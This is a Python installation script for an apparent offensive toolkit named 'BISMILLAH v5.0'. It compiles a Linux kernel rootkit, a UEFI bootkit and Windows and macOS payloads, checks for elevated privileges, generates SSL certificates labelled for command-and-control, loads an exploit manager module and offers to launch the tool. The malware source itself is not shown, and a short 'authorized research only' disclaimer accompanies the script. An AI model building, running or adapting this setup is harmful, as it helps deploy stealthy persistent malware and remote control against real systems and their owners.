#!/usr/bin/env python3
"""
BISMILLAH v5.0 - Installation and Execution Script
==================================================

This script handles:
1. Dependency installation
2. C code compilation
3. System checks
4. Tool execution

Author: Advanced Threat Research Division
Version: 5.0.0
Classification: TOP SECRET
"""

import os
import sys
import subprocess
import platform
import shutil
from pathlib import Path

def check_python_version():
    """Check if Python version is compatible"""
    if sys.version_info < (3, 8):
        print("❌ Error: Python 3.8+ required")
        sys.exit(1)
    print(f"✅ Python {sys.version_info.major}.{sys.version_info.minor} detected")

def install_dependencies():
    """Install Python dependencies"""
    print("📦 Installing Python dependencies...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], 
                      check=True, capture_output=True)
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], 
                      check=True)
        print("✅ Dependencies installed successfully")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error installing dependencies: {e}")
        sys.exit(1)

def compile_c_code():
    """Compile C code components"""
    print("🔨 Compiling C code components...")
    system = platform.system()
    
    # Compile kernel rootkit (Linux only)
    kernel_dir = Path("kernel_rootkit")
    if system == "Linux" and kernel_dir.exists():
        if shutil.which("make"):
            try:
                subprocess.run(["make", "-C", str(kernel_dir)], check=True, capture_output=True)
                print("✅ Kernel rootkit compiled")
            except subprocess.CalledProcessError:
                print("⚠️  Kernel rootkit compilation failed (requires kernel headers)")
        else:
            print("⚠️  'make' not found. Skipping kernel rootkit compilation.")
    elif system == "Windows":
        print("ℹ️  Skipping Linux kernel rootkit compilation on Windows.")
    
    # Compile UEFI bootkit (Linux/macOS only)
    uefi_dir = Path("uefi_bootkit")
    if system in ("Linux", "Darwin") and uefi_dir.exists():
        if shutil.which("make"):
            try:
                subprocess.run(["make", "-C", str(uefi_dir)], check=True, capture_output=True)
                print("✅ UEFI bootkit compiled")
            except subprocess.CalledProcessError:
                print("⚠️  UEFI bootkit compilation failed (requires EDK2)")
        else:
            print("⚠️  'make' not found. Skipping UEFI bootkit compilation.")
    elif system == "Windows":
        print("ℹ️  Skipping UEFI bootkit compilation on Windows.")
    
    # Compile Windows payloads (Windows only)
    windows_dir = Path("windows_payloads")
    if system == "Windows" and windows_dir.exists():
        if shutil.which("gcc"):
            try:
                for c_file in windows_dir.glob("*.c"):
                    output = c_file.with_suffix(".exe")
                    subprocess.run(["gcc", "-o", str(output), str(c_file)], check=True, capture_output=True)
                print("✅ Windows payloads compiled")
            except subprocess.CalledProcessError:
                print("⚠️  Windows payloads compilation failed (requires gcc)")
        else:
            print("⚠️  'gcc' not found. Skipping Windows payload compilation.")
    elif system != "Windows":
        print("ℹ️  Skipping Windows payload compilation on non-Windows OS.")
    
    # Compile macOS payloads (macOS only)
    macos_dir = Path("macos_payloads")
    if system == "Darwin" and macos_dir.exists():
        if shutil.which("gcc"):
            try:
                for c_file in macos_dir.glob("*.c"):
                    output = c_file.with_suffix("")
                    subprocess.run(["gcc", "-o", str(output), str(c_file)], check=True, capture_output=True)
                print("✅ macOS payloads compiled")
            except subprocess.CalledProcessError:
                print("⚠️  macOS payloads compilation failed (requires gcc)")
        else:
            print("⚠️  'gcc' not found. Skipping macOS payload compilation.")
    elif system != "Darwin":
        print("ℹ️  Skipping macOS payload compilation on non-macOS OS.")

def check_system_requirements():
    """Check system requirements"""
    print("🔍 Checking system requirements...")
    
    system = platform.system()
    print(f"✅ Operating System: {system}")
    
    # Check for required tools
    required_tools = {
        "Linux": ["nmap", "gcc", "make"],
        "Windows": ["nmap", "gcc"],
        "Darwin": ["nmap", "gcc", "make"]
    }
    
    tools = required_tools.get(system, [])
    for tool in tools:
        if shutil.which(tool):
            print(f"✅ {tool} found")
        else:
            print(f"⚠️  {tool} not found (some features may not work)")
    
    # Check for root/admin privileges
    is_admin = False
    if system == "Windows":
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
    else:
        try:
            is_admin = os.geteuid() == 0
        except AttributeError:
            is_admin = False
    if is_admin:
        print("✅ Running with elevated privileges")
    else:
        print("⚠️  Not running with elevated privileges (some features may not work)")

def create_directories():
    """Create necessary directories"""
    print("📁 Creating directories...")
    
    directories = [
        "logs",
        "data",
        "certs",
        "temp",
        "modules/morph_cache"
    ]
    
    for directory in directories:
        Path(directory).mkdir(parents=True, exist_ok=True)
    
    print("✅ Directories created")

def generate_certificates():
    """Generate SSL certificates for C2"""
    print("🔐 Generating SSL certificates...")
    
    cert_dir = Path("certs")
    cert_dir.mkdir(exist_ok=True)
    
    import shutil
    if shutil.which("openssl") is None:
        print("⚠️  openssl not found in PATH. Skipping certificate generation. Some features may not work.")
        return
    try:
        # Generate self-signed certificate
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:4096", 
            "-keyout", "certs/bismillah.key", 
            "-out", "certs/bismillah.crt", 
            "-days", "365", "-nodes", 
            "-subj", "/C=US/ST=State/L=City/O=Organization/CN=bismillah.local"
        ], check=True, capture_output=True)
        print("✅ SSL certificates generated")
    except subprocess.CalledProcessError:
        print("⚠️  SSL certificate generation failed (requires openssl)")

def run_tests():
    """Run basic tests"""
    print("🧪 Running basic tests...")
    
    try:
        # Test imports
        import modules.config
        import modules.logger
        import modules.exploit_manager
        print("✅ Module imports successful")
        
        # Test configuration loading
        config = modules.config.load_config()
        print("✅ Configuration loading successful")
        
        # Test logging
        modules.logger.log_event("test", "Installation test successful".encode())
        print("✅ Logging system functional")
        
    except Exception as e:
        print(f"❌ Test failed: {e}")
        return False
    
    return True

def main():
    """Main installation and execution function"""
    print("🚀 BISMILLAH v5.0 - Installation and Execution")
    print("=" * 50)
    
    # Check Python version
    check_python_version()
    
    # Install dependencies
    install_dependencies()
    
    # Check system requirements
    check_system_requirements()
    
    # Create directories
    create_directories()
    
    # Generate certificates
    generate_certificates()
    
    # Compile C code
    compile_c_code()
    
    # Run tests
    if not run_tests():
        print("❌ Installation failed")
        sys.exit(1)
    
    print("\n🎉 Installation completed successfully!")
    print("\n⚠️  IMPORTANT SECURITY NOTICE:")
    print("This tool is designed for authorized cybersecurity research only.")
    print("Use only in controlled, isolated environments with proper authorization.")
    print("The authors are not responsible for any misuse of this software.")
    
    # Ask user if they want to run the tool
    response = input("\n🚀 Do you want to run BISMILLAH now? (y/N): ")
    if response.lower() in ['y', 'yes']:
        print("\n🚀 Starting BISMILLAH v5.0...")
        try:
            subprocess.run([sys.executable, "bismillah.py"])
        except KeyboardInterrupt:
            print("\n⏹️  BISMILLAH stopped by user")
        except Exception as e:
            print(f"\n❌ Error running BISMILLAH: {e}")
    else:
        print("\n📝 To run BISMILLAH later, use: python3 bismillah.py")

if __name__ == "__main__":
    main() 